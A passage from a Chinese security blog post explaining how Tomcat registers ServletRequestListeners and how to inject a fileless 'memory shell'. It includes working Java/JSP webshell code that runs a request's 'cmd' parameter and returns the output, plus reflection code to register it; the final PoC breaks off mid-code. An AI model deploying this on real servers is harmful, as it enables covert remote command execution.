@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"hai0unu11.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-tomorrow"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Listener 是监听 Application、Session、Request 三大对象创建&#x2F;销毁及属性变化的组件，触发时自动执行代码，常用于统计在线人数、访问量等。 三类域监听器：  ServletContextListener：监听应用启动和关闭。 HttpSessionListener：监听会话创建和销毁。 ServletRequestListener：监听每次 HTTP 请求的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Listener 型内存马">
+<meta property="og:url" content="https://hai0unu11.github.io/2026/08/06/Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="Hai0uBlog">
+<meta property="og:description" content="Listener 是监听 Application、Session、Request 三大对象创建&#x2F;销毁及属性变化的组件，触发时自动执行代码，常用于统计在线人数、访问量等。 三类域监听器：  ServletContextListener：监听应用启动和关闭。 HttpSessionListener：监听会话创建和销毁。 ServletRequestListener：监听每次 HTTP 请求的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783910786989-0813995f-d03f-41f2-9a95-0eff71210daf.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783910989010-2dad70aa-106d-40d2-aa63-e4e1cba66501.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783911870508-2fd1850e-f6b6-4911-b42b-c29dd9a5a253.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783911406016-5c54f1ba-8872-4d88-b63f-40d09631252f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783912013316-25f464e8-4e51-4d49-8b1b-4104f416d900.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783912229640-30b9307e-762b-49fc-b761-fa9c17b69d69.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783912258850-25f36801-71c6-4a90-a348-a04b5c9d08e9.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783912281988-200b3483-357b-45f7-b3d0-6b46caddc64e.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783912309257-64eae5a9-4470-4073-9d2c-8263d39343f3.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783912385030-79dd22cb-e93f-4f3a-9b79-be69f6065943.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783912470476-3e4b37e9-ae0a-43aa-ac78-5141bff95385.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783925722327-493630d4-bdf2-42df-bf5f-0764d866108f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783926239844-8936f2fe-82f1-419e-abe2-5591e897c181.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783926316828-14a0ec99-9dfc-4b71-a15d-14d536356195.png">
+<meta property="article:published_time" content="2026-08-06T09:41:10.000Z">
+<meta property="article:modified_time" content="2026-08-06T09:51:07.434Z">
+<meta property="article:author" content="Hai0u">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783910786989-0813995f-d03f-41f2-9a95-0eff71210daf.png">
+
+
+<link rel="canonical" href="https://hai0unu11.github.io/2026/08/06/Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hai0unu11.github.io/2026/08/06/Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/","path":"2026/08/06/Listener-型内存马/","title":"Listener 型内存马"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Listener 型内存马 | Hai0uBlog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hai0uBlog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">好好学习，天天向上！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">0x01 环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-Listener-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">1.1.Listener 流程分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#http%E8%AF%B7%E6%B1%82%E8%A7%A6%E5%8F%91"><span class="nav-number">1.1.1.</span> <span class="nav-text">http请求触发</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Listner-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC-EXP-%E7%BC%96%E5%86%99"><span class="nav-number">1.2.</span> <span class="nav-text">Listner 型内存马 EXP 编写</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Hai0u</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hai0unu11.github.io/2026/08/06/Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Hai0u">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hai0uBlog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Listener 型内存马 | Hai0uBlog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Listener 型内存马
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-08-06 17:41:10 / 修改时间：17:51:07" itemprop="dateCreated datePublished" datetime="2026-08-06T17:41:10+08:00">2026-08-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/code-audit/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>Listener 是监听 Application、Session、Request 三大对象创建&#x2F;销毁及属性变化的组件，触发时自动执行代码，常用于统计在线人数、访问量等。</p>
+<p><strong>三类域监听器</strong>：</p>
+<ul>
+<li><code>ServletContextListener</code>：监听应用启动和关闭。</li>
+<li><code>HttpSessionListener</code>：监听会话创建和销毁。</li>
+<li><code>ServletRequestListener</code>：监听每次 HTTP 请求的创建和销毁。</li>
+</ul>
+<p><strong>关键点</strong>：<code>ServletRequestListener</code>在每次访问任意资源时都会触发 <code>requestInitialized()</code>方法，因此非常适合用作<strong>内存马</strong>——动态注册一个 <code>ServletRequestListener</code>，即可在每次请求时执行恶意代码，无需文件落地。</p>
+<h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h1><p>Maven 3.6.3</p>
+<p>Tomcat 8.5.81</p>
+<p>Listener 的业务对象要实现 EventListener 这个接口（java.util.EventListene）</p>
+<p>实现内存马的话就需要找一个每个请求都会触发的 Listener，我们去寻找的时候一定是优先找 Servlet 开头的类。ServletRequestListener ，因为根据名字以及其中requestInitialized() 方法感觉我们的发送的每个请求都会触发这个监控器。</p>
+<p>javax.servlet.ServletRequestListener</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783910786989-0813995f-d03f-41f2-9a95-0eff71210daf.png" alt="img"></p>
+<p>简单写个案例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Listener;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;  </span><br><span class="line"><span class="keyword">import</span> java.util.EventListener;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebListener(&quot;/listenerTest&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerTest</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ListenerTest</span><span class="params">()</span>&#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Listener 被调用&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>web.xml</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;listener&gt;  </span><br><span class="line"> &lt;listener-class&gt;Listener.ListenerTest&lt;/listener-class&gt;  </span><br><span class="line">&lt;/listener&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783910989010-2dad70aa-106d-40d2-aa63-e4e1cba66501.png" alt="img"></p>
+<h2 id="1-1-Listener-流程分析"><a href="#1-1-Listener-流程分析" class="headerlink" title="1.1.Listener 流程分析"></a>1.1.Listener 流程分析</h2><p> 在configureContext() 方法在这个地方读取了 web.xml里面的Listener ，在此处打断点</p>
+<p>org.apache.catalina.startup.ContextConfig#configureContext</p>
+<p>获取到 web.xml</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783911870508-2fd1850e-f6b6-4911-b42b-c29dd9a5a253.png" alt="img"></p>
+<p>下一步应该是走到 addApplicationListener() ，读取完配置文件，加载 Listener</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783911406016-5c54f1ba-8872-4d88-b63f-40d09631252f.png" alt="img">应用启动的时候，StandardContext 会去调用 listenerStart() 方法。这个方法做了一些基础的安全检查，最后完成简单的 start 业务。</p>
+<p>org.apache.catalina.core.StandardContext#listenerStart</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783912013316-25f464e8-4e51-4d49-8b1b-4104f416d900.png" alt="img"></p>
+<p>listenerStart() 方法中有这么一个语句，是把之前的 Listener 存到这里面</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String listeners[] = findApplicationListeners();</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="http请求触发"><a href="#http请求触发" class="headerlink" title="http请求触发"></a>http请求触发</h3><p>断点位置如图</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783912229640-30b9307e-762b-49fc-b761-fa9c17b69d69.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783912258850-25f36801-71c6-4a90-a348-a04b5c9d08e9.png" alt="img"></p>
+<p>我们先进到 getApplicationEventListeners() 方法里面</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783912281988-200b3483-357b-45f7-b3d0-6b46caddc64e.png" alt="img"></p>
+<p>getApplicationEventListeners() 方法做了这么一件事：获取一个 Listener 数组</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783912309257-64eae5a9-4470-4073-9d2c-8263d39343f3.png" alt="img"></p>
+<p>applicationEventListenersList 是什么，可以看到 Listener 实际上是存储在 applicationEventListenersList 属性中的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783912385030-79dd22cb-e93f-4f3a-9b79-be69f6065943.png" alt="img"></p>
+<p>并且我们可以通过 StandardContext#addApplicationEventListener() 方法来添加 Listener</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addApplicationEventListener</span><span class="params">(Object listener)</span> &#123;</span><br><span class="line">        applicationEventListenersList.add(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后逻辑和 Filter 差不多的，Listener 这里有一个 Listener 数组，对应的 Filter 里面也有一个 Filter 数组。</p>
+<p>在 Listener 组内的 Listeners 会被逐个触发，最后到我们自己定义的 Listener 的 requestInitialized() 方法去。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783912470476-3e4b37e9-ae0a-43aa-ac78-5141bff95385.png" alt="img"></p>
+<p>在应用开始前：先读ContextConfig读取 web.xml→ listenerStart()实例化并分类存储 → 运行时：每次请求触发 ServletRequestListener.requestInitialized()。</p>
+<p>内存马只需通过反射获取 StandardContext，调用 addApplicationEventListener()即可动态注入。</p>
+<h2 id="Listner-型内存马-EXP-编写"><a href="#Listner-型内存马-EXP-编写" class="headerlink" title="Listner 型内存马 EXP 编写"></a>Listner 型内存马 EXP 编写</h2><ul>
+<li><strong>核心思路</strong>：利用 <code>ServletRequestListener</code>的 <code>requestInitialized()</code>方法，在每次请求时自动执行恶意代码（如命令执行）。</li>
+<li><strong>实现步骤</strong>：</li>
+</ul>
+<ol>
+<li><strong>获取</strong> <code>**StandardContext**</code><strong>对象</strong>（与 Filter 型相同，通过反射穿透门面模式）。</li>
+<li><strong>创建恶意 Listener 实例</strong>，实现 <code>ServletRequestListener</code>接口，将恶意代码写在 <code>requestInitialized()</code>中。</li>
+<li><strong>调用</strong> <code>**StandardContext.addApplicationEventListener(listener)**</code> 动态注册该 Listener。</li>
+</ol>
+<ul>
+<li><strong>关键点</strong>：Listener 的注册机制与 Filter 类似，但无需配置 URL 映射，因为 <code>ServletRequestListener</code>会<strong>自动监听所有请求</strong>，比 Filter 更简洁。</li>
+<li><strong>执行顺序</strong>：注册后，后续每次请求都会先触发恶意 Listener 的 <code>requestInitialized()</code>，再进入 Filter 链和 Servlet，从而实现无文件 Webshell。</li>
+</ul>
+<p><strong>一句话总结</strong>：获取 StandardContext → 创建恶意 Listener → 调用 <code>addApplicationEventListener()</code>注册，即可在每次请求时自动执行恶意代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Listener 实例：只创建一次，常驻内存</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动时执行一次（由容器在 listenerStart() 中实例化时调用，但 ServletRequestListener 没有单独的 init 方法，</span></span><br><span class="line">    <span class="comment">// 可以在构造函数中完成初始化）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilListener</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">/* 初始化恶意代码所需的资源（可选） */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 每次 HTTP 请求到来时都会执行这个方法，但 Listener 对象还是同一个</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="comment">// 恶意代码主体：从请求参数获取命令并执行</span></span><br><span class="line">        String cmd;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            cmd = sre.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="comment">// 通过反射获取底层 Request 对象（绕过门面模式）</span></span><br><span class="line">            org.apache.catalina.connector.<span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span></span><br><span class="line">                (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> Class.forName(</span><br><span class="line">                <span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span>).getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestField.get(requestFacade);</span><br><span class="line">            <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="keyword">while</span> ((i = inputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="number">0</span>, i));</span><br><span class="line">                    response.getWriter().write(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace(); <span class="comment">// 实际攻击中通常静默处理</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 请求销毁时执行（可用于清理，但内存马通常不依赖此方法）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="comment">/* 可选的后置处理 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着是获取 StandardContext 的代码，并且添加 Listener</p>
+<p>在 org.apache.catalina.core.StandardHostValve#invoke 中，可以看到其通过request对象来获取 StandardContext 类</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783925722327-493630d4-bdf2-42df-bf5f-0764d866108f.png" alt="img"></p>
+<p>JSP内置了request对象，可以通过这个方式来获取</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后添加监听器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="type">Shell_Listener</span> <span class="variable">shell_Listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Listener</span>();</span><br><span class="line">    context.addApplicationEventListener(shell_Listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最终poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Arrays&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;  </span><br><span class="line">&lt;%!  </span><br><span class="line">  </span><br><span 